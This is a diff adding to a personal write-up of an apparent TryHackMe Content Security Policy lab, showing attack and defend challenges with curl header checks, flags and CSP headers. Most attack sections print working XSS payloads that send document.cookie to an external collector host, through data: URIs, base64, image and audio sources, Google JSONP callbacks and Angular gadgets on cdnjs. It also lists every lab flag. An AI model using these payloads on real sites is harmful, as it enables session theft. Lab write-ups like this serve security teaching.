@@ -293,3 +293,299 @@ or
 
 <script src="data:application/javascript,eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))"></script>
 
+or
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ echo -n 'fetch(`https://witty.free.beeceptor.com/${document.cookie}`)' | base64
+ZmV0Y2goYGh0dHBzOi8vd2l0dHkuZnJlZS5iZWVjZXB0b3IuY29tLyR7ZG9jdW1lbnQuY29va2ll
+fWAp
+
+<script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vd2l0dHkuZnJlZS5iZWVjZXB0b3IuY29tLyR7ZG9jdW1lbnQuY29va2ll
+fWAp"></script>
+
+:)
+
+GET `/flag=THM%7BUs1ng_data:_1snt_Any_S4fer%7D`
+
+200 0.0s a few seconds ago
+
+flag=THM{Us1ng_data:_1snt_Any_S4fer}
+```
+Flag for attack-3
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://34.243.75.161:3003/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-inline'
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/"186-Tk8eKoRn272qfFoaFdWERRH8q5I"
+Connection: keep-alive
+
+enter text:
+<script>(new Image()).src = `https://witty.free.beeceptor.com/${encodeURIComponent(document.cookie)}`</script>
+
+or
+
+<IMG id="witty" src="">
+<script>document.getElementById('witty').src="https://witty.free.beeceptor.com/" + document.cookie;</script>
+
+GET `/flag%3DTHM%7BTh4ts_N0t_4n_1m4ge!!%7D`
+
+200 0.0s a few seconds ago
+
+flag=THM{Th4ts_N0t_4n_1m4ge!!}
+```
+Flag for attack-4
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://34.243.75.161:3004/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/"186-k9TfFAl9EuH3JyjY2OwJDOKF5g0"
+Connection: keep-alive
+
+<script nonce="abcdef">eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))</script>
+
+or
+
+<link id="witty" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('witty').href="https://witty.free.beeceptor.com/" + document.cookie;</script>
+
+GET `/flag=THM%7BStyle_Y0ur_W3bs1teS%7D`
+
+200 0.0s 3 minutes ago
+
+flag=THM{Style_Y0ur_W3bs1teS}
+```
+Flag for attack-5
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://34.243.75.161:3005/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/"186-RgvJ6xDqmBUDrHWsndjbCIZvwVE"
+Connection: keep-alive
+
+nice writeup: https://weizman.github.io/page-whatsapp-vuln/
+
+https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
+
+#Google.com:
+
+"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+"><script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
+
+"><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
+
+"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
+
+"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+
+*.google.com (subdomain)
+
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))"></script>
+
+GET `/flag=THM%7BN0_JSONP_D0mains_Plz%7D`
+
+429 0.0s a minute ago (cz many requests (free acc))
+
+flag=THM{N0_JSONP_D0mains_Plz}
+```
+Flag for attack-6
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://34.245.72.50:3006/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/"186-dyUmDNHThGqYNHzzoVqcbliNcLE"
+Connection: keep-alive
+
+Cloudflare es una empresa que ofrece una variedad de servicios de seguridad y desempeño para sitios web. Sus servicios incluyen protección contra ataques DDoS, aceleración de contenido, y privacidad DNS. También ofrece opciones para mejorar la seguridad del sitio, como la autenticación de usuarios y la encriptación SSL. Es usado para proteger y optimizar la disponibilidad y seguridad de las aplicaciones web.
+
+https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
+<div ng-app ng-csp>
+  {{$on.curry.call().document.location='https://witty.free.beeceptor.com/' + $on.curry.call().document.cookie}}
+</div>
+
+or
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
+<div ng-app ng-csp>
+{{$on.curry.call().document.location='https://witty.free.beeceptor.com/' + $on.curry.call().document.cookie}}
+</div>
+
+GET `/flag=THM%7BTrust_N0_CDN%7D`
+
+429 0.0s a few seconds ago
+
+flag=THM{Trust_N0_CDN}
+```
+Flag for attack-7
+The 404 error looks kinda weird...
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://34.245.72.50:3007/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/"186-EZI6yduyqDsJUnzCnKoXDx69AdA"
+Connection: keep-alive
+
+<script src="/'; new Audio('https://witty.free.beeceptor.com/'+document.cookie);'"></script>
+
+GET `/flag=THM%7BTh1s_4udio_S0unds_N1ce%7D`
+
+429 0.0s a few seconds ago
+
+flag=THM{Th1s_4udio_S0unds_N1ce}
+
+This appears to be a script that attempts to inject malicious code into a website. The script attempts to load an audio file from a remote server, and appends the current user's cookies to the URL. The script could potentially be used to steal user data, or execute other malicious actions. It's important not to execute this script or to be careful when visiting websites that use it.
+```
+### CSP Sandbox :: Defend challenges
+To deploy the machine, go to the **CSP Sandbox** task.
+**Defend** challenges require you to defend the website from XSS attacks by creating a CSP header that blocks them, whilst allowing the legitimate scripts to execute.
+Answer the questions below
+![[Pasted image 20230112131231.png]]
+What is the flag for defend-1?
+```text
+http://54.229.103.59:3008/defend-1.js
+
+const defend1Real = true;
+console.log('__defend-1_REAL=' + defend1Real);
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://54.229.103.59:3008/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 559
+ETag: W/"22f-UkwilPDk3jkDrMwbmYqT0VEU9E0"
+Connection: keep-alive
+
+adding: Content-Security-Policy: script-src 'self'
+
+so enter
+
+script-src 'self'
+
+<br><i>The attackers have sent the following:</i>
+<script>const defend1Real=0||console.log("__EVIL__")</script>
+<script src=data:application/javascript,defend1Real=0||console.log(`__EVIL__`)></script>
+<svg style=display:none onload="defend1Real=0||console.log(`__EVIL__`)">
+<img style=display:none src=[/x](http://54.229.103.59:3008/x) onerror="defend1Real=0||console.log(`__EVIL__`)">
+You have successfully defended the server against attackers!  
+Here's your reward: THM{N0_0utside_S0urces}
+```
+What is the flag for defend-2?
+```text
+
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://54.229.103.59:3009/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 615
+ETag: W/"267-BP86b/pS4qwW5ko90IpiLspvqsM"
+Connection: keep-alive
+
+view-source:http://54.229.103.59:3009/
+
+<script nonce="ae3b00">defend2Real=true;console.log("__defend-2_REAL="+defend2Real)</script>
+
+so enter
+
+script-src 'nonce-ae3b00'
+
+<br><i>The attackers have sent the following:</i>
+<script nonce="aaaaaa">const defend2Real=0||console.log("__EVIL__")</script>
+<script src=data:application/javascript,defend2Real=0||console.log(`__EVIL__`)></script>
+<svg style=display:none onload="defend2Real=0||console.log(`__EVIL__`)">
+<img style=display:none src=[/x](http://54.229.103.59:3009/x) onerror="defend2Real=0||console.log(`__EVIL__`)">
+You have successfully defended the server against attackers!  
+Here's your reward: THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}
+```
+What is the flag for defend-3?
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://54.229.103.59:3010/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 575
+ETag: W/"23f-Bp0kZ6R5i4GQS7KpLf5RoPOuIjA"
+Connection: keep-alive
+
+An ETag (Entity Tag) is an HTTP response header used to determine whether a cached version of a resource is still valid. The ETag value is a string that is assigned by the server to a specific version of a resource, and it is returned to the client in the response headers. When the client makes a subsequent request for the same resource, it sends the ETag value back to the server in the "If-None-Match" request header. The server can then compare the sent ETag with the current ETag for the resource, and if they match, the server can respond with a "304 Not Modified" status code, indicating that the cached version of the resource is still valid.
+
+An ETag is similar to Last-Modified header in that it also allows caching, but it is more specific and allows for caching of resources that change frequently.
+
+view-source:http://54.229.103.59:3010/
+<script>console.log("__defend-3_REAL=true")</script>
+
+https://report-uri.com/home/hash
+console.log("__defend-3_REAL=true") (hash it)
+
+**Here is your hash value: 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='**
+
+so enter
+
+script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='
+
+<script>console.log("__EVIL__");</script>
+<svg onload=console.log(`__EVIL__`) />
+_The attackers have sent the following:_ 
+
+You have successfully defended the server against attackers!  
+Here's your reward: THM{Hash_Y0ur_1nl1ne_Scr1pts}
+```
+```text
+Playground
+```
+```text
+┌──(kali㉿kali)-[~/nappy]
+└─$ curl http://54.229.103.59:3011/ -I
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/html; charset=utf-8
+Content-Length: 638
+ETag: W/"27e-C7NtyVS9gpQyBNmv0X3TRQElG4w"
+Connection: keep-alive
+```
+![[Pasted image 20230112133644.png]]
+
+## Flags / Answers
+- ***THM{Th4t_W4s_Pr3tty_3asy}***
+- ***THM{Us1ng_data:_1snt_Any_S4fer}***
+- ***THM{Th4ts_N0t_4n_1m4ge!!}***
+- ***THM{Style_Y0ur_W3bs1teS}***
+- ***THM{N0_JSONP_D0mains_Plz}***
+- ***THM{Trust_N0_CDN}***
+- ***THM{Th1s_4udio_S0unds_N1ce}***
+- ***THM{N0_0utside_S0urces}***
+- ***THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}***
+- ***THM{Hash_Y0ur_1nl1ne_Scr1pts}***
+
+## Notes / Lessons Learned
+[[Biblioteca]]
+
